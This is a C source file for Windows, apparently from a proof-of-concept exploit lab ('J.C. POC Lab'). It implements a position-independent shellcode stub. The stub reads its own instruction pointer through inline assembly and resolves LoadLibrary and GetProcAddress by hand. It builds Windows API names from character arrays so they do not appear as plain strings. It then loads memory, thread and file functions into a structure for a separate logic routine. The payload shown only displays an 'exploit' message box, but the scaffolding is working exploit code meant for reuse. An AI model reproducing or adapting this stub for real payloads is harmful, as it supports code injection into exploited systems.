#include <windows.h>
#include <Shlobj.h>
#include "definitions.h"
#include "LogicalEntryPoint.h"

#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment


int __stdcall ResolverEntryPoint()
{
	DWORD dwCurrentAddr = 0;

	// Get current EIP in dwCurrentAddr
	__asm {
		call lbl_ref1
		lbl_ref1 :
		pop dwCurrentAddr
	}

	// *** Resolve API
	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();

	CHAR messageBoxTitle[] = { 'J', '.', 'C', '.', ' ', 'P', 'O', 'C', ' ', 'L', 'a', 'b', 0x0 };
	CHAR messageBoxText[] = { 'A', 'n', 'o', 't', 'h', 'e', 'r', ' ', 'S', 'u', 'c', 'c', 'e', 'f', 'u', 'l', 't', ' ', 'E', 'x', 'p', 'l', 'o', 'i', 't', '!', ' ', '\n', 'J', '.', 'C', '.', ' ', 'O', 'u', 't', '.', 0x0 };

	CHAR strUser32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR strShlwapi[] = { 'S', 'h', 'l', 'w', 'a', 'p', 'i', 0x0 };
	CHAR strShell32[] = { 'S', 'h', 'e', 'l', 'l', '3', '2', 0x0 };
	CHAR strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	CHAR strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
	CHAR strVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
	CHAR strVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
	CHAR strGetModuleFileName[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x0 };
	CHAR strGetModuleHandleA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
	CHAR strCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
	CHAR strExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	CHAR strGetEnvironmentVariableA[] = { 'G', 'e', 't', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'V', 'a', 'r', 'i', 'a', 'b', 'l', 'e', 'A', 0x0 };
	CHAR strPathRemoveFileSpecA[] = { 'P', 'a', 't', 'h', 'R', 'e', 'm', 'o', 'v', 'e', 'F', 'i', 'l', 'e', 'S', 'p', 'e', 'c', 'A', 0x0 };
	CHAR strGetFileAttributesA[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
	CHAR strSetFileAttributesA[] = { 'S', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
	CHAR strCreateDirectoryA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0 };
	CHAR strGetLastError[] = { 'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0x0 };
	CHAR strSetCurrentDirectoryA[] = { 'S', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0 };
	CHAR strCreateFileA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
	CHAR strCreateFileW[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0x0 };
	CHAR strWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
	CHAR strCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
	CHAR strSHGetSpecialFolderPathW[] = { 'S', 'H', 'G', 'e', 't', 'S', 'p', 'e', 'c', 'i', 'a', 'l', 'F', 'o', 'l', 'd', 'e', 'r', 'P', 'a', 't', 'h', 'W', 0x0 };
	CHAR strGetShortPathNameW[] = { 'G', 'e', 't', 'S', 'h', 'o', 'r', 't', 'P', 'a', 't', 'h', 'N', 'a', 'm', 'e', 'W', 0x0 };
	CHAR strPathAddBackslashW[] = { 'P', 'a', 't', 'h', 'A', 'd', 'd', 'B', 'a', 'c', 'k', 's', 'l', 'a', 's', 'h', 'W', 0x0 };
	CHAR strPathAppendW[] = { 'P', 'a', 't', 'h', 'A', 'p', 'p', 'e', 'n', 'd', 'W', 0x0 };
	CHAR strExitThread[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
	CHAR strMessageBoxA[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x','A', 0x0 };
	
	MESSAGEBOXA pfn_MessageBoxA = (MESSAGEBOXA)pfn_GetProcAddress(pfn_LoadLibrary(strUser32), strMessageBoxA);
	EXITPROCESS pfn_ExitProcess = (EXITPROCESS)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strExitProcess);
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualAlloc);
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualFree);
	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualProtect);
	GETMODULEFILENAME pfn_GetModuleFileNameA = (GETMODULEFILENAME)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetModuleFileName);
	GETMODULEHANDLE pfn_GetModuleHandleA = (GETMODULEHANDLE)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetModuleHandleA);
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualQuery);
	CREATETHREAD pfn_CreateThread = (CREATETHREAD)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateThread);
	GETENVIRONMENTVARIABLE pfn_GetEnvironmentVariableA = (GETENVIRONMENTVARIABLE)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetEnvironmentVariableA);
	PATHREMOVEFILESPEC pfn_PathRemoveFileSpecA = (PATHREMOVEFILESPEC)pfn_GetProcAddress(pfn_LoadLibrary(strShlwapi), strPathRemoveFileSpecA);
	GETFILEATTRIBUTESA pfn_GetFileAttributesA = (GETFILEATTRIBUTESA)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetFileAttributesA);
	SETFILEATTRIBUTESA pfn_SetFileAttributesA = (SETFILEATTRIBUTESA)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strSetFileAttributesA);
	CREATEDIRECTORY pfn_CreateDirectoryA = (CREATEDIRECTORY)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateDirectoryA);
	GETLASTERROR pfn_GetLastError = (GETLASTERROR)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetLastError);
	SETCURRENTDIRECTORY pfn_SetCurrentDirectoryA = (SETCURRENTDIRECTORY)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strSetCurrentDirectoryA);
	CREATEFILEA pfn_CreateFileA = (CREATEFILEA)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateFileA);
	CREATEFILEW pfn_CreateFileW = (CREATEFILEW)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateFileW);
	WRITEFILE pfn_WriteFile = (WRITEFILE)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strWriteFile);
	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCloseHandle);
	SHGETFOLDERW pfn_SHGetSpecialFolderPathW = (SHGETFOLDERW)pfn_GetProcAddress(pfn_LoadLibrary(strShell32), strSHGetSpecialFolderPathW);
	GETSHORTPATHNAMEW pfn_GetShortPathNameW = (GETSHORTPATHNAMEW)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetShortPathNameW);
	PATHADDBACKSLASHW pfn_PathAddBackslashW = (PATHADDBACKSLASHW)pfn_GetProcAddress(pfn_LoadLibrary(strShlwapi), strPathAddBackslashW);
	PATHAPPENDW pfn_PathAppendW = (PATHAPPENDW)pfn_GetProcAddress(pfn_LoadLibrary(strShlwapi), strPathAppendW);

	PMY_DATA pData = (PMY_DATA)pfn_VirtualAlloc(NULL, sizeof(MY_DATA), MEM_COMMIT, PAGE_READWRITE);
	pData->ExitProcess = pfn_ExitProcess;
	pData->LoadLibraryA = pfn_LoadLibrary;
	pData->GetProcAddress = pfn_GetProcAddress;
	pData->VirtualAlloc = pfn_VirtualAlloc;
	pData->VirtualFree = pfn_VirtualFree;
	pData->VirtualProtect = pfn_VirtualProtect;
	pData->GetModuleFileNameA = pfn_GetModuleFileNameA;
	pData->GetModuleHandleA = pfn_GetModuleHandleA;
	pData->CreateThread = pfn_CreateThread;
	pData->GetEnvironmentVariableA = pfn_GetEnvironmentVariableA;
	pData->PathRemoveFileSpecA = pfn_PathRemoveFileSpecA;
	pData->GetFileAttributesA = pfn_GetFileAttributesA;
	pData->PathRemoveFileSpecA = pfn_PathRemoveFileSpecA;
	pData->SetFileAttributesA = pfn_SetFileAttributesA;
	pData->CreateFileA = pfn_CreateFileA;
	pData->CreateFileW = pfn_CreateFileW;
	pData->WriteFile = pfn_WriteFile;
	pData->CloseHandle = pfn_CloseHandle;
	pData->MessageBoxA = pfn_MessageBoxA;

	PARGUMENTS pArguments = (PARGUMENTS)pfn_VirtualAlloc(NULL, sizeof(ARGUMENTS), MEM_COMMIT, PAGE_READWRITE);


	pArguments->MessageBoxTitle = messageBoxTitle;
	pArguments->MessageBoxText = messageBoxText;

	LogicEntryPoint(pData, pArguments);

}
FUNCTION_END(ResolverEntryPoint);



#pragma code_seg()
#pragma optimize( "", on )
